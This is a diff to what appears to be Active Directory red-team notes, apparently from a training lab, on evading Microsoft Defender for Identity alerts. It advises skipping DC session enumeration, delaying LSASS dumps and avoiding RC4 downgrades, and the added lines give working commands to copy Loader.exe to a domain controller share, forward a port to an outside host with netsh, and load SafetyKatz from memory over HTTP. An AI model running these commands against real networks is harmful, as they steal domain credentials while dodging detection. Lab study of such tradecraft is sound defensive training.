@@ -13,3 +13,10 @@
 * While running Bloodhound Ingestors if we specify collection method as all then it enumerates/lists the sessions on the DC which the MDI triggers as malicious and triggers alarms, so it is recommended to specify `-ExcludeDC` flag to reduce the chances of triggering alarms ‒ **Since the sessions on DC aren't enumerated it can lead to losing few results on "Shortest Path to DC" in Bloodhound**
 * **Extracting creds from LSASS should be the last vector to try cause it is more prone to detection**
 * While using pass the hash or any attacks always use `aes256` and `not rc4 (if possible)`. Cause the encryption downgrade from `aes256 to rc4 will be flagged by the MDI`
+*   Whenever you want to execute any binary or exe, it is recommended instead of directly downloading it to the disk of the remote machine, it is recommended to load it using the `loader.exe`
+
+    * First copy the loader onto the remote machine - `echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y`
+    * Connect to the remote machine using winrs or PS Remoting or anything - Basically get a shell
+    * Create a port forward onto your machine - `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+    * Now using `loader.exe` load the remote binary/exe - `Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe`
+
